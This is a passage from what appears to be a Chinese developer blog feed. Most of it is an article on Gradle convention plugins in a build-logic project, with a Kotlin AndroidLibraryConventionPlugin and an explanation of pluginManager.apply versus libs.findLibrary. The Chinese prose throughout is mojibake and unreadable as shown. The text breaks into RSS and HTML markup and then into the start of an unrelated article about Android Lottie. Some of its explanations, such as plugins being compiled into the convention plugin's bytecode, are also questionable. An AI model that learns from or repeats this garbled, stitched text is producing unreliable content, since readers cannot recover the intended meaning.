<p>å¦‚æœä¸æ¸…æ¥šçš„æˆ–è€…å‡çº§æ—¶éœ€è¦åŒæ­¥å‡çº§çš„ï¼Œé‚£å°±éœ€è¦å¤‡æ³¨å¥½ã€‚</p>
<h2 data-id="heading-2">çº¦å®šæ’ä»¶</h2>
<p>åœ¨åˆ›å»ºbuild-logicæ–‡ä»¶å¤¹çš„æ—¶å€™ï¼Œ</p>
<p>è¿™æ˜¯ä¸€ä¸ªä¸ä»å±äºappçš„ç‹¬ç«‹gradleé¡¹ç›®ï¼Œ</p>
<p>è€Œä¸”è¿™å®è·µæ˜¯Googleé¦–æ¬¡ä½¿ç”¨ï¼Œ</p>
<p>å› æ­¤ï¼Œåˆ›å»ºçš„å¿«æ·æ–¹å¼å¹¶æ²¡æœ‰é›†æˆåˆ°ASä¸­ï¼Œ</p>
<p>æ‰€ä»¥ï¼Œæ–‡ä»¶å¤¹éƒ½æ˜¯æ‰‹åŠ¨åˆ›å»ºçš„ã€‚ï¼ˆæ²¡æœ‰å¿˜è®°æ€ä¹ˆç”¨æ–‡ä»¶å¤¹åˆ›å»ºé¡¹ç›®ï¼‰</p>
<ol>
<li>
<p>é¡¹ç›®ç›®å½•åˆ›å»ºå®Œæˆ</p>
</li>
<li>
<p>å¼€å§‹åˆ›å»ºçº¦å®šæ’ä»¶</p>
</li>
<li>
<p>/convention/src/mian/kotlin</p>
<p>åˆ›å»ºä¸€ä¸ªåä¸ºAndroidApplicationConventionPluginçš„kotlinç±»ï¼Œ</p>
<p>çº¦å®šAndroidç›¸å…³çš„é…ç½®ï¼›</p>
</li>
<li>
<p>/conventionæ¨¡å—ä¸‹</p>
<p>åˆ›å»ºbuild.gradle.kts</p>
<p>åœ¨æ–‡ä»¶ä¸­ï¼Œé…ç½®ç¼–è¯‘build-logicéœ€è¦ç”¨åˆ°çš„æ’ä»¶å’Œç¯å¢ƒï¼Œ</p>
<p>ç„¶åæ˜¯registeræ³¨å†Œçº¦å®šæ’ä»¶ï¼Œå…³è”ä¸Škotlinç±»ï¼Œ</p>
</li>
<li>
<p>/build-logicç›®å½•ä¸‹</p>
<p>åˆ›å»ºsetting.gradle.kts</p>
<p>é…ç½®é¡¹ç›®çš„æ ¹æ–‡ä»¶ï¼Œ</p>
<p>å°†conventionå…³è”åˆ°build-logicé¡¹ç›®ä¸‹ï¼Œ</p>
<p>ç°åœ¨å¯ä»¥äº†å—ï¼Ÿ</p>
<p>è¿˜ä¸è¡Œï¼Œ</p>
</li>
<li>
<p>å…³è”build-logicåˆ°ä¸»é¡¹ç›®setting.gradle.kts</p>
<p>åœ¨ä¸»é¡¹ç›®çš„setting.gradle.ktsæ–‡ä»¶é‡Œï¼Œ</p>
<p>pluginManagmentçš„ä½œç”¨åŸŸé‡Œï¼Œ</p>
<p>æ·»åŠ includeBuild("build-logic")ï¼Œ</p>
<p>ç„¶åï¼ŒåŒæ­¥syncã€‚</p>
</li>
<li>
<p>ä½¿ç”¨çº¦å®šæ’ä»¶</p>
<p>åœ¨ä¸šåŠ¡æ¨¡å—build.gradle.ktsæ–‡ä»¶é‡Œï¼Œ</p>
<p>pluginsä½œç”¨åŸŸä¸­ï¼Œaliaså…³è”ä¸Šçº¦å®šæ’ä»¶ï¼Œ</p>
<p>è¯•è¯•æœ‰æ²¡æœ‰çœŸçš„èƒ½å¤Ÿæ­£å¸¸ä½¿ç”¨ã€‚</p>
<p>ä»¥ä¸Šå°±æ˜¯åˆ›å»ºçº¦å®šæ’ä»¶çš„æ€è·¯ã€‚</p>
<p>è¿˜æ˜¯èƒ½å¤Ÿçœ‹å‡ºæ¥ï¼Œåªéœ€è¦å†™ä¸€æ¬¡ï¼Œå°±å¯ä»¥åˆ°å¤„ä½¿ç”¨ï¼Œ</p>
<p>çœŸçš„æ–¹ä¾¿ä¸å°‘ã€‚</p>
</li>
</ol>
<h2 data-id="heading-3">ä¸ºä»€ä¹ˆapply()çš„å‚æ•°ä¸ç”¨libs.findLibrary</h2>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> com.mircles.allfuntionlearning.libs
<span class="hljs-keyword">import</span> org.gradle.api.JavaVersion
<span class="hljs-keyword">import</span> org.gradle.api.Plugin
<span class="hljs-keyword">import</span> org.gradle.api.Project
<span class="hljs-keyword">import</span> org.gradle.kotlin.dsl.configure
<span class="hljs-keyword">import</span> org.gradle.kotlin.dsl.dependencies


<span class="hljs-keyword">class</span> <span class="hljs-title class_">AndroidLibraryConventionPlugin</span> : <span class="hljs-type">Plugin</span>&lt;<span class="hljs-type">Project</span>&gt; {

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">apply</span><span class="hljs-params">(target: <span class="hljs-type">Project</span>)</span></span> {

        with(target) {
            <span class="hljs-comment">// 1. åº”ç”¨ä¸€äº›å¿…éœ€çš„åŸºç¡€æ’ä»¶</span>
            pluginManager.apply {
                apply(<span class="hljs-string">"com.android.library"</span>) <span class="hljs-comment">// åº”ç”¨Androidåº“æ’ä»¶</span>
                apply(<span class="hljs-string">"org.jetbrains.kotlin.android"</span>) <span class="hljs-comment">// åº”ç”¨Kotlin Androidæ’ä»¶</span>
            }

            <span class="hljs-comment">// 2. é…ç½®Androidé—­åŒ…ï¼ˆè¿™æ˜¯çº¦å®šçš„æ ¸å¿ƒï¼‰</span>
            extensions.configure&lt;com.android.build.gradle.LibraryExtension&gt; {
                compileSdk = <span class="hljs-number">36</span> <span class="hljs-comment">// ç»Ÿä¸€ç¼–è¯‘SDKç‰ˆæœ¬</span>

                defaultConfig {
                    minSdk = <span class="hljs-number">24</span> <span class="hljs-comment">// ç»Ÿä¸€æœ€å°SDKç‰ˆæœ¬</span>
                    <span class="hljs-comment">// å…¶ä»–é€šç”¨é…ç½®...</span>
                }

                compileOptions {
                    sourceCompatibility = JavaVersion.VERSION_17
                    targetCompatibility = JavaVersion.VERSION_17
                }

                <span class="hljs-comment">// å¦‚æœé¡¹ç›®ä½¿ç”¨Composeï¼Œå¯ä»¥åœ¨è¿™é‡Œç»Ÿä¸€é…ç½®</span>
                buildFeatures {
                    compose = <span class="hljs-literal">true</span>
                }
                <span class="hljs-comment">//ï¼Ÿï¼Ÿé…ç½®çš„ä»€ä¹ˆ</span>
                composeOptions {
                    kotlinCompilerExtensionVersion = <span class="hljs-string">"1.5.4"</span>
                }
            }

            <span class="hljs-comment">// 3. æ·»åŠ é€šç”¨ä¾èµ–</span>
            dependencies {
                <span class="hljs-comment">// æ·»åŠ å¯¹æ‰€æœ‰Androidåº“æ¨¡å—éƒ½é€šç”¨çš„ä¾èµ–</span>

                <span class="hljs-comment">//å¼•ç”¨çš„ä¾èµ–æŒ‡å‘libs.versions.tomlæ–‡ä»¶ï¼Œè¿™æ˜¯åˆç†çš„ã€‚aliasæ˜¯ï¼Ÿ</span>
                <span class="hljs-string">"implementation"</span>(libs.findLibrary(<span class="hljs-string">"androidx-core-ktx"</span>).<span class="hljs-keyword">get</span>())
            }
        }

    }

}
</code></pre>
<p>èƒ½åšåˆ°ï¼Œä½†æ²¡å¿…è¦ã€‚</p>
<p>è¿™é‡Œä½“ç°çš„æ˜¯Gradleæ’ä»¶ä¾èµ–ç®¡ç†çš„â€œ<strong>ä¸¤çº§æœºåˆ¶</strong>â€ã€‚</p>
<p><code>apply()</code>åº”ç”¨çš„å‚æ•°æ˜¯ä¸»é¡¹ç›®çš„libs.versionsçš„ä¾èµ–idã€‚</p>
<p>åœ¨ç¼–è¯‘çš„æ—¶å€™ï¼Œbuild-logicä¼šæ‹‰å–å¯¹åº”çš„idå’Œç‰ˆæœ¬ï¼Œç¼–è¯‘åˆ°çº¦å®šæ’ä»¶ä¸­ã€‚</p>
<p>è¿™ä¸ªé—®é¢˜éå¸¸å…³é”®ï¼Œå®ƒè§¦åŠäº†Gradleçº¦å®šæ’ä»¶è®¾è®¡çš„æ ¸å¿ƒæ¨¡å¼ã€‚è¿™ä¸¤ç§ä¸åŒçš„å†™æ³•ï¼Œæ°æ°ä½“ç°äº†Â  <strong>â€œæ„å»ºé…ç½®â€ä¸â€œé¡¹ç›®ä¾èµ–â€</strong> Â åœ¨ç®¡ç†å“²å­¦ä¸Šçš„æ ¹æœ¬åŒºåˆ«ã€‚</p>
<p>ç®€å•æ¥è¯´ï¼š<strong><code>pluginManager.apply</code>Â æ˜¯åœ¨â€œæ­¦è£…â€è¿™ä¸ªçº¦å®šæ’ä»¶è‡ªèº«ï¼Œè€ŒÂ <code>dependencies.add</code>Â æ˜¯åœ¨ä¸ºæœ€ç»ˆåº”ç”¨è¯¥æ’ä»¶çš„ä¸šåŠ¡æ¨¡å—â€œé¢„è£…â€é€šç”¨ä¾èµ–ã€‚</strong></p>
<p>ç”¨å®‰è£…æ“ä½œç³»ç»Ÿçš„æ¯”å–»æ¥ç†è§£ï¼š</p>
<ul>
<li><strong>æ’ä»¶</strong>Â (<code>pluginManager.apply</code>)ï¼šå°±åƒæ“ä½œç³»ç»Ÿå®‰è£…ç›˜<strong>è‡ªå¸¦çš„é©±åŠ¨ç¨‹åº</strong>ã€‚æ²¡æœ‰å®ƒä»¬ï¼Œå®‰è£…ç›˜æœ¬èº«å°±æ— æ³•è¯†åˆ«åŸºç¡€ç¡¬ä»¶ï¼ˆå¦‚Androidã€Kotlinç¯å¢ƒï¼‰ã€‚è¿™äº›é©±åŠ¨å¿…é¡»åœ¨<strong>åˆ¶ä½œå®‰è£…ç›˜æ—¶å°±æ‰“åŒ…è¿›å»</strong>ã€‚</li>
<li><strong>åº“ä¾èµ–</strong>Â (<code>dependencies.add</code>)ï¼šå°±åƒæ“ä½œç³»ç»Ÿ<strong>é»˜è®¤å®‰è£…çš„è½¯ä»¶åŒ…</strong>ï¼ˆå¦‚è®°äº‹æœ¬ã€æµè§ˆå™¨ï¼‰ã€‚è¿™äº›è½¯ä»¶åŒ…çš„å®šä¹‰å’Œç‰ˆæœ¬ä¿¡æ¯ä¿å­˜åœ¨ä¸€ä¸ªâ€œè½¯ä»¶ä»“åº“åˆ—è¡¨â€é‡Œï¼Œå®‰è£…ç³»ç»Ÿæ—¶å†ä»åˆ—è¡¨é‡Œå®æ—¶ä¸‹è½½å®‰è£…ã€‚</li>
</ul>
<p>ä¸‹é¢æ˜¯è¿™ä¸¤ä¸ªå±‚çº§çš„è¯¦ç»†è¯´æ˜ï¼š</p>
<h3 data-id="heading-4"><strong>ç¬¬ä¸€çº§ï¼šæ„å»ºâ€œå®‰è£…ç›˜â€ï¼ˆç¼–è¯‘Â <code>build-logic</code>Â é¡¹ç›®ï¼‰</strong></h3>
<p>å½“Gradleç¼–è¯‘ä½ çš„Â <code>build-logic</code>Â é¡¹ç›®ï¼Œç”Ÿæˆçº¦å®šæ’ä»¶ï¼ˆ<code>.class</code>æ–‡ä»¶ï¼‰æ—¶ï¼š</p>
<ol>
<li>
<p><strong><code>pluginManager.apply("com.android.library")</code></strong></p>
<ul>
<li><strong>æ—¶æœº</strong>ï¼šåœ¨ç¼–è¯‘<code>build-logic</code><strong>è¿‡ç¨‹ä¸­</strong>æ‰§è¡Œã€‚</li>
<li><strong>ä½œç”¨</strong>ï¼šå‘Šè¯‰Gradleï¼šâ€œåœ¨ç¼–è¯‘æˆ‘ï¼ˆè¿™ä¸ªçº¦å®šæ’ä»¶ï¼‰çš„æ—¶å€™ï¼Œè¯·æŠŠAndroidåº“æ’ä»¶å’ŒKotlinæ’ä»¶çš„èƒ½åŠ›é“¾æ¥è¿›æ¥ã€‚â€ åªæœ‰è¿™æ ·ï¼Œæ¥ä¸‹æ¥çš„Â <code>android {}</code>Â å’ŒÂ <code>kotlinOptions {}</code>Â ç­‰æ‰©å±•æ‰èƒ½åœ¨ä»£ç ä¸­è¢«è¯†åˆ«å’Œè°ƒç”¨ã€‚</li>
<li><strong>ç»“æœ</strong>ï¼šè¿™äº›æ’ä»¶è¢«ç¼–è¯‘åˆ°çº¦å®šæ’ä»¶çš„å­—èŠ‚ç é‡Œï¼Œæˆä¸ºå…¶<strong>å›ºæœ‰çš„ä¸€éƒ¨åˆ†</strong>ã€‚</li>
</ul>
</li>
<li>
<p><strong><code>libs.findLibrary("kotlin.stdlib").get()</code></strong></p>
<ul>
<li><strong>æ—¶æœº</strong>ï¼šè¿™è¡Œä»£ç <strong>æœ¬èº«</strong>åœ¨ç¼–è¯‘<code>build-logic</code>æ—¶è¢«ç¼–è¯‘ã€‚ä½†Â <code>findLibrary</code>Â <strong>è¿™ä¸ªåŠ¨ä½œ</strong>å¹¶ä¸ä¼šå‘ç”Ÿï¼Œå®ƒåªæ˜¯ä¸€ä¸ªâ€œæŸ¥æ‰¾æŒ‡ä»¤â€è¢«ä¿å­˜ä¸‹æ¥ã€‚</li>
<li><strong>å…³é”®</strong>ï¼š<code>libs</code>Â å¯¹è±¡æ­¤æ—¶åªè¢«ç”¨ä½œ<strong>ç±»å‹å®‰å…¨çš„å¼•ç”¨</strong>ã€‚<code>build-logic</code>Â é¡¹ç›®éœ€è¦å£°æ˜å¯¹Â <code>version-catalog</code>Â API çš„ä¾èµ–ï¼Œæ‰èƒ½è®¤è¯†Â <code>libs</code>Â è¿™ä¸ªç±»å‹ï¼Œä½†å¹¶ä¸éœ€è¦ï¼ˆä¹Ÿä¸ä¼šï¼‰åœ¨æ­¤æ—¶è§£æå‡ºå…·ä½“çš„Â <code>kotlin-stdlib:1.9.0</code>ã€‚å…·ä½“çš„æŸ¥æ‰¾åŠ¨ä½œè¢«<strong>æ¨è¿Ÿ</strong>åˆ°ç¬¬äºŒçº§ã€‚</li>
</ul>
</li>
</ol>
<h3 data-id="heading-5"><strong>ç¬¬äºŒçº§ï¼šä½¿ç”¨â€œå®‰è£…ç›˜â€ï¼ˆä¸šåŠ¡æ¨¡å—åº”ç”¨çº¦å®šæ’ä»¶ï¼‰</strong></h3>
<p>å½“ä½ åœ¨Â <code>:feature:settings</code>Â æ¨¡å—ä¸­æ‰§è¡ŒÂ <code>plugins { id("nowinandroid.android.library") }</code>Â æ—¶ï¼š</p>
<ol>
<li>
<p>Gradleä¼šåŠ è½½å¹¶æ‰§è¡Œå·²ç¼–è¯‘å¥½çš„Â <code>AndroidLibraryConventionPlugin</code>Â çš„Â <code>apply</code>Â æ–¹æ³•ã€‚</p>
</li>
<li>
<p>å½“æ‰§è¡Œåˆ°Â <code>dependencies.add("implementation", libs.findLibrary("kotlin.stdlib").get())</code>Â æ—¶ï¼š</p>
<ul>
<li><strong>æ ¸å¿ƒ</strong>ï¼šè¿™é‡Œçš„Â <code>libs</code>Â å¯¹è±¡ï¼Œ<strong>ä¸å†æ˜¯</strong>Â <code>build-logic</code>Â é¡¹ç›®é‡Œçš„é‚£ä¸ªï¼Œè€Œæ˜¯<strong>å½“å‰ä¸šåŠ¡æ¨¡å—</strong>ï¼ˆ<code>:feature:settings</code>ï¼‰çš„Â <code>libs</code>Â å¯¹è±¡ï¼</li>
<li><strong>æŸ¥æ‰¾</strong>ï¼šå®ƒä¼šåœ¨å½“å‰æ¨¡å—çš„ä¸Šä¸‹æ–‡ä¸­ï¼Œå»æŸ¥æ‰¾Â <code>libs.versions.toml</code>Â ä¸­å®šä¹‰çš„Â <code>kotlin.stdlib</code>ï¼Œè§£æå‡ºå®Œæ•´çš„ä¾èµ–åæ ‡ã€‚</li>
<li><strong>æ·»åŠ </strong>ï¼šå°†è¿™ä¸ªè§£æå¥½çš„ä¾èµ–ï¼Œä»¥Â <code>implementation</code>Â é…ç½®æ·»åŠ åˆ°å½“å‰æ¨¡å—ä¸­ã€‚</li>
</ul>
</li>
</ol>
<h3 data-id="heading-6"><strong>ä¸ºä»€ä¹ˆä¾èµ–å¿…é¡»ç”¨Â <code>findLibrary</code>Â è¿™ç§â€œæ¨è¿Ÿâ€å†™æ³•ï¼Ÿ</strong></h3>
<p>è¿™æ˜¯ä¸ºäº†è·å¾—<strong>æœ€å¤§çš„çµæ´»æ€§ä¸å¯ç»´æŠ¤æ€§</strong>ï¼š</p>
<ol>
<li><strong>å•ä¸€çœŸå®æ¥æº</strong>ï¼šæ‰€æœ‰æ¨¡å—çš„ä¾èµ–ç‰ˆæœ¬å§‹ç»ˆç”±æ ¹é¡¹ç›®çš„Â <code>libs.versions.toml</code>Â æ§åˆ¶ã€‚å¦‚æœä½ æƒ³å‡çº§Kotlinç‰ˆæœ¬ï¼Œåªéœ€åœ¨<code>toml</code>æ–‡ä»¶ä¸­æ”¹ä¸€å¤„ï¼Œæ‰€æœ‰åº”ç”¨äº†çº¦å®šæ’ä»¶çš„æ¨¡å—éƒ½ä¼šè‡ªåŠ¨ä½¿ç”¨æ–°ç‰ˆæœ¬ã€‚</li>
<li><strong>é¿å…è€¦åˆ</strong>ï¼šå¦‚æœåƒæ’ä»¶ä¸€æ ·åœ¨Â <code>build-logic</code>Â ä¸­å›ºåŒ–ä¾èµ–ç‰ˆæœ¬ï¼Œé‚£ä¹ˆÂ <code>build-logic</code>Â å°±éœ€è¦ä¸ºæ¯ä¸ªåº“å£°æ˜å…·ä½“ç‰ˆæœ¬ï¼Œè¿™ä¼šä½¿å®ƒå˜å¾—è‡ƒè‚¿ï¼Œä¸”ä¸ä¸šåŠ¡æ¨¡å—çš„ä¾èµ–æ ‘ç´§å¯†è€¦åˆã€‚</li>
<li><strong>ç±»å‹å®‰å…¨ä¸IDEæ”¯æŒ</strong>ï¼š<code>libs.findLibrary</code>Â æä¾›äº†ç±»å‹å®‰å…¨å’ŒIDEè‡ªåŠ¨è¡¥å…¨ï¼ˆå› ä¸ºÂ <code>libs</code>Â å¯¹è±¡æ˜¯ä»Catalogç”Ÿæˆçš„APIï¼‰ã€‚è¿™æ¯”å†™å­—ç¬¦ä¸²Â <code>"org.jetbrains.kotlin:kotlin-stdlib-jdk8:1.9.0"</code>Â è¦å®‰å…¨ã€æ–¹ä¾¿å¾—å¤šã€‚</li>
</ol>
<h3 data-id="heading-7"><strong>æ€»ç»“ä¸å¯¹æ¯”</strong></h3>






























<table><thead><tr><th>ç‰¹æ€§</th><th><code>pluginManager.apply("æ’ä»¶ID")</code></th><th><code>dependencies.add(libs.findLibrary("xxx"))</code></th></tr></thead><tbody><tr><td><strong>ä½œç”¨å¯¹è±¡</strong></td><td>è£…å¤‡<strong>çº¦å®šæ’ä»¶æœ¬èº«</strong>ï¼Œä½¿å…¶å…·æœ‰ç‰¹å®šèƒ½åŠ›ï¼ˆé…ç½®Androidã€Kotlinï¼‰</td><td>ä¸º<strong>åº”ç”¨æ­¤æ’ä»¶çš„ä¸šåŠ¡æ¨¡å—</strong>æ·»åŠ é€šç”¨åº“ä¾èµ–</td></tr><tr><td><strong>è§£ææ—¶æœº</strong></td><td>åœ¨<strong>ç¼–è¯‘Â <code>build-logic</code>Â é¡¹ç›®æ—¶</strong>è§£æå¹¶é”å®š</td><td>åœ¨<strong>ä¸šåŠ¡æ¨¡å—åº”ç”¨æ’ä»¶æ—¶</strong>ï¼Œä»è¯¥æ¨¡å—çš„Catalogä¸­è§£æ</td></tr><tr><td><strong>ç‰ˆæœ¬ç®¡ç†</strong></td><td>ç‰ˆæœ¬åœ¨Â <code>build-logic/build.gradle.kts</code>Â çš„Â <code>dependencies</code>Â ä¸­é”å®š</td><td>ç‰ˆæœ¬å»¶è¿Ÿåˆ°ä¸šåŠ¡æ¨¡å—ä¸­ï¼Œä»Â <code>libs.versions.toml</code>Â è§£æ</td></tr><tr><td><strong>ç±»æ¯”</strong></td><td><strong>å®‰è£…ç›˜è‡ªå¸¦çš„é©±åŠ¨</strong>ï¼ˆæ‰“åŒ…æ—¶å›ºåŒ–ï¼‰</td><td><strong>ä»è½¯ä»¶åº“å®‰è£…çš„é»˜è®¤è½¯ä»¶</strong>ï¼ˆå®‰è£…æ—¶æ ¹æ®åˆ—è¡¨ä¸‹è½½ï¼‰</td></tr></tbody></table>
<p>æ‰€ä»¥ï¼Œè¿™ä¸æ˜¯ä¸ä¸€è‡´ï¼Œè€Œæ˜¯ä¸€ç§ç²¾å¦™çš„åˆ†å±‚è®¾è®¡ã€‚å®ƒç¡®ä¿äº†çº¦å®šæ’ä»¶æœ¬èº«çš„ç¨³å®šæ€§å’Œä¸šåŠ¡æ¨¡å—ä¾èµ–ç®¡ç†çš„çµæ´»æ€§ã€‚</p>
<p>å¦‚æœä½ å°è¯•åœ¨Â <code>build-logic</code>Â çš„æ’ä»¶ä»£ç ä¸­ç¡¬ç¼–ç ä¸€ä¸ªåº“çš„å­—ç¬¦ä¸²åæ ‡ï¼Œä½ ä¼šå‘ç°ä¸šåŠ¡æ¨¡å—ç¡®å®èƒ½ç”¨åˆ°è¿™ä¸ªä¾èµ–ï¼Œä½†<strong>ç‰ˆæœ¬å‡çº§å°†å˜å¾—æå…¶å›°éš¾</strong>ï¼Œå› ä¸ºä½ å¿…é¡»é‡æ–°å‘å¸ƒÂ <code>build-logic</code>Â æ’ä»¶ã€‚è€Œç°åœ¨çš„â€œæ¨è¿ŸæŸ¥æ‰¾â€æ¨¡å¼å®Œç¾åœ°é¿å…äº†è¿™ä¸ªé—®é¢˜ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Android Lottieä½¿ç”¨ï¼Œå¦‚ä½•è‡ªå®šä¹‰LottieViewï¼Ÿ]]></title>    <link>https://juejin.cn/post/7589942565011865626</link>    <guid>https://juejin.cn/post/7589942565011865626</guid>    <pubDate>2026-01-02T08:53:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589942565011865626" data-draft-id="7590503651116253234" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Android Lottieä½¿ç”¨ï¼Œå¦‚ä½•è‡ªå®šä¹‰LottieViewï¼Ÿ"/> <meta itemprop="keywords" content="å‰ç«¯,Android"/> <meta itemprop="datePublished" content="2026-01-02T08:53:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å›½å®¶äºŒçº§ç¼–ç¨‹çˆ±å¥½è€…"/> <meta itemprop="url" content="https://juejin.cn/user/317113014162615"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Android Lottieä½¿ç”¨ï¼Œå¦‚ä½•è‡ªå®šä¹‰LottieViewï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/317113014162615/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å›½å®¶äºŒçº§ç¼–ç¨‹çˆ±å¥½è€…
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T08:53:10.000Z" title="Fri Jan 02 2026 08:53:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Lottie</h2>
<h3 data-id="heading-1">1.ç®€ä»‹</h3>
<p>æœ€è¿‘åœ¨åšå…¬å¸é¡¹ç›®æ—¶å€™ï¼Œæœ‰æ¶‰åŠåˆ°åŠ è½½åŠ¨ç”»æ–‡ä»¶ï¼Œçœ‹åˆ°ä»¥å‰çš„é¡¹ç›®ä½¿ç”¨çš„æ˜¯<a href="https://link.juejin.cn?target=https%3A%2F%2Flottie.airbnb.tech%2F%23%2F" target="_blank" title="https://lottie.airbnb.tech/#/" ref="nofollow noopener noreferrer">Lottie</a>è¿™ä¸ªåº“ã€‚</p>
